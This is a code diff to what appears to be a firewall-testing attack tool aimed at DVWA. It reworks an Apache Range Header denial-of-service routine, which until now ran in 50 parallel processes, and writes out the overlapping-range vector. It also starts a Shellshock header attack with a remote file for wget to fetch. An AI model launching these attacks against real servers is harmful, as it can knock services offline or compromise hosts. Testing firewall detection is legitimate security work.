@@ -1331,9 +1331,10 @@ class DVWAAttacks:
             request = urllib2.Request(targetpage, None, req_headers)
             request.get_method = lambda : 'HEAD'
             response = fp.open(request)
-            #print response.code
+            return response.code
         except:
-            pass
+            return 500
+
         
     def attackrequest_headers(self, fp, targetpage):
         targetpage = vars.getUrl()
@@ -1356,6 +1357,7 @@ class DVWAAttacks:
                        'Connection': 'close'
                        }
         
+        '''
         processes = [multiprocessing.Process(target=self.apache_range_header_dos, args=(fp,req_headers,)) for x in range(50)]
         # Run processes
         for p in processes:
@@ -1364,19 +1366,31 @@ class DVWAAttacks:
         # Exit the completed processes
         for p in processes:
             p.join()
+        '''
+        the_resp = self.apache_range_header_dos(fp=fp, req_headers=req_headers)
             
         dos_type = "Apache Range Header DoS Attack"
         the_vect = "Range: bytes=0-,5-0,5-1,5-2, ... 5-1294,5-1295,5-1296,5-1297,5-1298,5-1299 ..."
 
+        '''
         if funcs.is_target_up(fp=fp):
             discattacks.append(the_vect)
             vars.typecount['request_headers'][1] += 1
             self.htmlgen.writeHtmlTableCell(success=True, attackType=dos_type,
                                             target=targetpage, vect=the_vect)
         else:
+        '''
+        #print the_resp
+        #print type(the_resp)
+        if the_resp in vars.waf_response_codes:
             vars.typecount['request_headers'][2] += 1
             self.htmlgen.writeHtmlTableCell(success=False, attackType=dos_type,
-                                            target=targetpage, vect=the_vect)   
+                                            target=targetpage, vect=the_vect)
+        else:
+            discattacks.append(the_vect)
+            vars.typecount['request_headers'][1] += 1
+            self.htmlgen.writeHtmlTableCell(success=True, attackType=dos_type,
+                                            target=targetpage, vect=the_vect)            
         ########################################################################
         ssv_header_attack = "Shellshock vector - HTTP Request Header Attack"
         wget_remote_file = "https://resources.bayshorenetworks.com/145eb731643f6f3516f2b5b41637a3dcc1a593404810a150f37f886195b2e2e3/bin_malicious_md5_hashes.MD5.txt"
